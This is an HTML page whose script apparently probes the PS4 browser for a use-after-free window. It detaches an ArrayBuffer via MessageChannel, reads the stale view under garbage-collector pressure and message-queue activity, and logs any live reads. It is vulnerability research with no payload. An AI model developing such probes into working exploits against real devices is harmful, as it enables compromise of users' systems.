<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UaF Window Harness — Post-Detach</title>
</head>
<body>

<h3>Potential Use-After-Detach Window — Auto Harness</h3>

<button id="run">RUN AUTO</button>
<pre id="log"></pre>

<script>
(() => {
"use strict";

const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }

function delay(ms){ return new Promise(r => setTimeout(r, ms)); }

function gcPressure(){
  const arr = [];
  for (let i=0;i<200;i++){
    arr.push(new ArrayBuffer(1024*1024));
  }
  return arr;
}

async function attempt(iter){

  const ch = new MessageChannel();

  const ab = new ArrayBuffer(4096);
  const view = new Uint8Array(ab);
  view[0] = 0xAA;

  let got;
  ch.port2.onmessage = e => { got = e.data; };

  try{
    ch.port1.postMessage(ab, [ab]);
  }catch{
    return { kind:"THROW" };
  }

  const detached = (ab.byteLength === 0);

  // 1️⃣ immediate read
  let imm;
  try { imm = view[0]; }
  catch(e){ imm = "THREW"; }

  // 2️⃣ microtask read
  await Promise.resolve();
  let micro;
  try { micro = view[0]; }
  catch(e){ micro = "THREW"; }

  // 3️⃣ GC pressure
  gcPressure();
  let afterGC;
  try { afterGC = view[0]; }
  catch(e){ afterGC = "THREW"; }

  // 4️⃣ queue activity
  ch.port1.postMessage("ping");
  await delay(0);

  let afterQueue;
  try { afterQueue = view[0]; }
  catch(e){ afterQueue = "THREW"; }

  return {
    detached,
    gotType: typeof got,
    imm,
    micro,
    afterGC,
    afterQueue
  };
}

async function run(){

  log("RUN :: UaF Window Auto");
  log("================================");

  const N = 40;

  let uafHits = 0;
  let drops = 0;

  for (let i=0;i<N;i++){

    const r = await attempt(i);

    if (!r.detached) continue;

    if (r.gotType === "undefined") drops++;

    const reads = [r.imm, r.micro, r.afterGC, r.afterQueue];

    const hasLiveRead =
      reads.some(v => typeof v === "number" && v === 0xAA);

    if (hasLiveRead){
      uafHits++;
      log("UAF_WINDOW :: " + JSON.stringify(r));
    }
  }

  log("================================");
  log("SUMMARY");
  log(JSON.stringify({ drops, uafHits }, null, 2));
}

document.getElementById("run").onclick = () => {
  run().catch(()=>log("ERROR"));
};

})();
</script>

</body>
</html>
